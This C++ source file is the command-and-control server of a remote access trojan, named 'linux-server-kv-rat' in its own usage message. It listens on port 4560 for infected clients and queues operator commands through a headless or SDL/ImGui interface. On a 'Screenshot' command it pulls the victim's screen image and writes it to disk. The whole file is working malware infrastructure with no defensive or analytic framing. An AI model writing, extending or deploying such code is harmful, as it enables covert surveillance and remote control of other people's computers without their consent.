#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <cstring>
#include <fstream>
#include <vector>
#include <arpa/inet.h>
#include "external/SDL2/SDL.h"
#include "external/SDL2/SDL_image.h"
#include "external/imgui/imgui.h"
#include "external/imgui/imgui_impl_sdl2.h"
#include "external/imgui/imgui_impl_opengl3.h"
#include "external/imgui/imgui_stdlib.h"
#include <stdio.h>
#include "external/SDL2/SDL_opengl.h"
#include <thread>
#include <queue>
#include <mutex>
#include <condition_variable>
#include "external/nlohmann/json.hpp"
#include "gui.h"

const int DEFAULT_PORT = 4560;
const int BUFFER_SIZE = 4096;

std::queue<std::string> commandQueue;  // Shared command queue
std::mutex queueMutex;                 // Mutex for command queue
std::condition_variable dataCond; 

std::string receiveData(int clientSocket) 
{
    char buffer[BUFFER_SIZE];
    ssize_t bytesRead = recv(clientSocket, buffer, BUFFER_SIZE, 0);
    if (bytesRead <= 0)
        return "";
    return std::string(buffer, bytesRead);
}
std::vector<char> receiveBinaryData(int clientSocket) 
{
    char buffer[BUFFER_SIZE];  // Temporary buffer
    std::vector<char> fullData;  // Vector to hold the complete binary data

    ssize_t bytesRead;
    do {
        bytesRead = recv(clientSocket, buffer, BUFFER_SIZE, 0);
        if (bytesRead > 0) {
            // Check for EOF marker
            if (bytesRead >= 3 && std::string(buffer + bytesRead - 3, 3) == "EOF") {
                fullData.insert(fullData.end(), buffer, buffer + bytesRead - 3);  // Exclude EOF
                break;
            }
            // Otherwise, append received bytes to the vector
            fullData.insert(fullData.end(), buffer, buffer + bytesRead);
        }
    } while (bytesRead > 0);  // Continue until socket is closed or an error occurs

    if (bytesRead < 0) {
        // Handle error
        std::cerr << "An error occurred while receiving data." << std::endl;
    }

    return fullData;  // Return the vector containing the received binary data
}

bool sendData(int clientSocket, const std::string& data) 
{
    ssize_t bytesSent = send(clientSocket, data.c_str(), data.length(), 0);
    return bytesSent == static_cast<ssize_t>(data.length());
}

std::string readDataFromStdin() 
{
    std::string input;
    std::cout << "MSG: ";
    std::getline(std::cin, input);
    return input;
}

void server(std::string& sharedOutput, int& mx, int& my) 
{
    int serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == -1) 
    {
        std::cerr << "Failed to create server socket.\n";
        return;
    }

    sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = INADDR_ANY;
    serverAddress.sin_port = htons(DEFAULT_PORT);

    if (bind(serverSocket, reinterpret_cast<sockaddr*>(&serverAddress), sizeof(serverAddress)) == -1) 
    {
        std::cerr << "Failed to bind to the server socket.\n";
        close(serverSocket);
        return;
    }

    if (listen(serverSocket, SOMAXCONN) == -1) 
    {
        std::cerr << "Listen failed.\n";
        close(serverSocket);
        return;
    }

    std::cout << "Server is running.\n";
    std::string ipAddress = inet_ntoa(serverAddress.sin_addr);
    std::cout << "Chosen IP address: " << ipAddress << std::endl;

    // This is just a loop to keep the server running even if the client crashes or disconnects, allowing the client to reconnect when it comes back online
    while(true)
    {
        sockaddr_in clientAddress{};
        socklen_t clientAddressSize = sizeof(clientAddress);

        int clientSocket = accept(serverSocket, reinterpret_cast<sockaddr*>(&clientAddress), &clientAddressSize);
        if (clientSocket == -1) 
        {
            std::cerr << "Accept failed.\n";
            continue;
        }

        std::cout << "Client connected.\n";
        sendData(clientSocket, "accepted.\n");

        while (true)
	    {
            std::unique_lock<std::mutex> lock(queueMutex);
            dataCond.wait(lock, []{ return !commandQueue.empty(); });  // Wait for data

            std::string command = commandQueue.front();  // Get command from shared queue
            commandQueue.pop();

            lock.unlock();

            // Now process 'command' as you would normally
            sendData(clientSocket, command);

            std::vector<char> imageData;

            if (command == "Screenshot")
	    	{
                std::cout << "Starting saving image.\n";
                sharedOutput += "Starting saving image.\n";
                imageData = receiveBinaryData(clientSocket);
                std::cout << "Binary data received! Size: " << imageData.size() << " bytes\n";
                sharedOutput += "Binary data received!\n";

                std::ofstream outFile("screenshot.png", std::ios::binary);
                if (outFile.is_open()) 
                {
                    std::cout << "Writing to file.\n";
                    sharedOutput += "Writing to file\n";
                    outFile.write(imageData.data(), imageData.size());
                    if (outFile.good()) {
                        std::cout << "Successfully wrote to the file.\n";
                        sharedOutput += "Successfully wrote to the file.\n";
                    } else {
                        std::cerr << "Failed to write all data to the file.\n";
                        sharedOutput += "Failed to write all data to the file.\n";
                    }
                    std::cout << "Closing file.\n";
                    sharedOutput += "Closing file.\n";
                    outFile.close();
                } 
                else 
                {
                    std::cerr << "Failed to open the file for writing." << std::endl;
                    sharedOutput += "Failed to open the file for writing.\n";
                }
                std::cout << "Saved image!\n";
                sharedOutput += "Saved image!\n";
                std::cout << "Showing image.\n";
                sharedOutput += "Showing image.\n";
                command.clear();
                //ShowScreenshotScreen();
	    	}
	    	else
	    	{
	    		std::string recv = receiveData(clientSocket);
	    		if (recv.empty())
	    		{
	    			std::cout << "Client disconnected.\n";
                    sharedOutput += "Client disconnected.\n";
	    			close(clientSocket);
                    break;
	    		}

	    		std::cout << "client: " << recv << "\n";
                sharedOutput += "client: " + recv + "\n";
                command.clear();
	    	}
	    }
    }
}

void sdl_thread(std::string& sharedOutput, int& mx, int& my, std::queue<std::string> &commandQueue, std::mutex &queueMutex, std::condition_variable &dataCond)
{
    SDL_IMGUI_GUI(sharedOutput, mx, my, commandQueue, queueMutex, dataCond);
}

void server_thread(std::string& sharedOutput, int& mx, int& my)
{
    server(sharedOutput, mx, my);
}

int main(int argc, char**argv) 
{
    if(argc < 2)
    {
        printf("Usage: ./linux-server-kv-rat [headless/gui]\n");
    }

    std::cout << "SDL2 Is in this build, very experimental\n";

    std::string sharedOutput;
    int x, y;

    if(std::string(argv[1]) == "headless")
    {
        //std::thread sdlThread(sdl_thread, std::ref(sharedOutput), std::ref(x), std::ref(y), std::ref(commandQueue), std::ref(queueMutex), std::ref(dataCond));
        std::thread serverThread(server_thread, std::ref(sharedOutput), std::ref(x), std::ref(y));

        //sdlThread.join();
        serverThread.join();
    }

    if(std::string(argv[1])== "gui")
    {
        std::thread sdlThread(sdl_thread, std::ref(sharedOutput), std::ref(x), std::ref(y), std::ref(commandQueue), std::ref(queueMutex), std::ref(dataCond));
        std::thread serverThread(server_thread, std::ref(sharedOutput), std::ref(x), std::ref(y));

        sdlThread.join();
        serverThread.join();
    }

    return 0;
}